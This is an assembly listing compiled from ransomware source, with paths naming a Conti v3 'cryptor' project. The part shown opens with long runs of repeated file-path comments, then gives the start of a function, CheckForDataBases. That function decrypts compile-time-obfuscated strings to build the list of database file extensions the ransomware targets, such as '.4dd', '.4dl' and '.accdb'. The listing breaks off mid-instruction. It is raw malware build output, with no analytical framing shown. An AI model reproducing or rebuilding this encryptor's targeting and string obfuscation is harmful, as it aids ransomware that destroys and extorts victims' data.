; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?CheckForDataBases@@YAHPEB_W@Z
_TEXT	SEGMENT
$T28 = 32
$T72 = 48
$T104 = 64
$T138 = 80
$T1 = 96
$T2 = 112
$T9 = 128
$T10 = 144
$T11 = 160
$T12 = 176
$T13 = 192
$T14 = 208
$T15 = 224
$T16 = 240
$T17 = 256
$T18 = 272
$T19 = 288
$T20 = 304
$T21 = 320
$T22 = 336
$T23 = 352
$T25 = 368
$T31 = 384
$T32 = 400
$T33 = 416
$T34 = 432
$T35 = 448
$T36 = 464
$T37 = 480
$T38 = 496
$T39 = 512
$T40 = 528
$T41 = 544
$T43 = 560
$T44 = 576
$T45 = 592
$T46 = 608
$T48 = 624
$T49 = 640
$T50 = 656
$T51 = 672
$T53 = 688
$T54 = 704
$T55 = 720
$T56 = 736
$T57 = 752
$T60 = 768
$T61 = 784
$T62 = 800
$T63 = 816
$T64 = 832
$T65 = 848
$T66 = 864
$T67 = 880
$T69 = 896
$T70 = 912
$T71 = 928
$T73 = 944
$T74 = 960
$T76 = 976
$T77 = 992
$T78 = 1008
$T79 = 1024
$T83 = 1040
$T84 = 1056
$T85 = 1072
$T86 = 1088
$T87 = 1104
$T88 = 1120
$T89 = 1136
$T90 = 1152
$T91 = 1168
$T92 = 1184
$T93 = 1200
$T94 = 1216
$T95 = 1232
$T96 = 1248
$T97 = 1264
$T98 = 1280
$T100 = 1296
$T101 = 1312
$T102 = 1328
$T103 = 1344
$T105 = 1360
$T107 = 1376
$T108 = 1392
$T109 = 1408
$T110 = 1424
$T111 = 1440
$T112 = 1456
$T113 = 1472
$T114 = 1488
$T115 = 1504
$T116 = 1520
$T117 = 1536
$T118 = 1552
$T119 = 1568
$T120 = 1584
$T122 = 1600
$T124 = 1616
$T125 = 1632
$T127 = 1648
$T128 = 1664
$T129 = 1680
$T130 = 1696
$T131 = 1712
$T132 = 1728
$T133 = 1744
$T134 = 1760
$T140 = 1776
$T141 = 1792
$T142 = 1808
$T143 = 1824
$T144 = 1840
$T145 = 1856
$T146 = 1872
$T147 = 1888
$T148 = 1904
$T149 = 1920
$T150 = 1936
$T151 = 1952
$T153 = 1968
$T154 = 1984
$T155 = 2000
$T158 = 2016
$T159 = 2032
$T161 = 2048
$T162 = 2064
$T163 = 2080
$T164 = 2096
$T165 = 2112
$T166 = 2128
$T167 = 2144
$T168 = 2160
$T169 = 2176
$T170 = 2192
$T171 = 2208
$T42 = 2224
$T47 = 2240
$T52 = 2256
$T68 = 2272
$T75 = 2288
$T80 = 2304
$T106 = 2320
$T121 = 2336
$T123 = 2352
$T139 = 2368
$T152 = 2384
$T3 = 2400
$T4 = 2416
$T5 = 2432
$T6 = 2448
$T7 = 2464
$T8 = 2480
$T58 = 2496
$T59 = 2512
$T81 = 2528
$T82 = 2544
$T156 = 2560
$T160 = 2576
$T24 = 2592
$T29 = 2616
$T30 = 2640
$T99 = 2664
$T135 = 2688
$T157 = 2712
$T136 = 2736
$T27 = 2760
$T126 = 2784
$T137 = 2808
$T26 = 2832
Extensions$ = 2864
Filename$ = 4256
_morph_var$172 = 4264
?CheckForDataBases@@YAHPEB_W@Z PROC			; CheckForDataBases, COMDAT

; 289  : {

$LN5752:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000a	55		 push	 rbp
  0000b	48 8d ac 24 70
	f0 ff ff	 lea	 rbp, QWORD PTR [rsp-3984]
  00013	b8 90 10 00 00	 mov	 eax, 4240		; 00001090H
  00018	e8 00 00 00 00	 call	 __chkstk
  0001d	48 2b e0	 sub	 rsp, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00020	c6 44 24 60 00	 mov	 BYTE PTR $T1[rsp], 0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 289  : {

  00025	48 8b d9	 mov	 rbx, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00028	c6 44 24 61 04	 mov	 BYTE PTR $T1[rsp+1], 4
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 294  : 		OBFW(L".4dd"),

  0002d	48 8d 4c 24 60	 lea	 rcx, QWORD PTR $T1[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00032	c6 44 24 62 61	 mov	 BYTE PTR $T1[rsp+2], 97	; 00000061H
  00037	c6 44 24 63 19	 mov	 BYTE PTR $T1[rsp+3], 25
  0003c	c6 44 24 64 61	 mov	 BYTE PTR $T1[rsp+4], 97	; 00000061H
  00041	c6 44 24 65 42	 mov	 BYTE PTR $T1[rsp+5], 66	; 00000042H
  00046	c6 44 24 66 61	 mov	 BYTE PTR $T1[rsp+6], 97	; 00000061H
  0004b	c6 44 24 67 42	 mov	 BYTE PTR $T1[rsp+7], 66	; 00000042H
  00050	c6 44 24 68 61	 mov	 BYTE PTR $T1[rsp+8], 97	; 00000061H
  00055	c6 44 24 69 61	 mov	 BYTE PTR $T1[rsp+9], 97	; 00000061H
  0005a	c6 44 24 6a 61	 mov	 BYTE PTR $T1[rsp+10], 97 ; 00000061H
  0005f	0f b6 44 24 61	 movzx	 eax, BYTE PTR $T1[rsp+1]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 294  : 		OBFW(L".4dd"),

  00064	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00069	48 89 85 30 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-256], rax

; 295  : 		OBFW(L".4dl"),

  00070	48 8d 4c 24 70	 lea	 rcx, QWORD PTR $T2[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00075	c6 44 24 70 00	 mov	 BYTE PTR $T2[rsp], 0
  0007a	c6 44 24 71 59	 mov	 BYTE PTR $T2[rsp+1], 89	; 00000059H
  0007f	c6 44 24 72 78	 mov	 BYTE PTR $T2[rsp+2], 120 ; 00000078H
  00084	c6 44 24 73 60	 mov	 BYTE PTR $T2[rsp+3], 96	; 00000060H
  00089	c6 44 24 74 78	 mov	 BYTE PTR $T2[rsp+4], 120 ; 00000078H
  0008e	c6 44 24 75 19	 mov	 BYTE PTR $T2[rsp+5], 25
  00093	c6 44 24 76 78	 mov	 BYTE PTR $T2[rsp+6], 120 ; 00000078H
  00098	c6 44 24 77 77	 mov	 BYTE PTR $T2[rsp+7], 119 ; 00000077H
  0009d	c6 44 24 78 78	 mov	 BYTE PTR $T2[rsp+8], 120 ; 00000078H
  000a2	c6 44 24 79 78	 mov	 BYTE PTR $T2[rsp+9], 120 ; 00000078H
  000a7	c6 44 24 7a 78	 mov	 BYTE PTR $T2[rsp+10], 120 ; 00000078H
  000ac	0f b6 44 24 71	 movzx	 eax, BYTE PTR $T2[rsp+1]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 295  : 		OBFW(L".4dl"),

  000b1	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  000b6	48 89 85 38 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-248], rax

; 296  : 		OBFW(L".accdb"),

  000bd	48 8d 8d 60 08
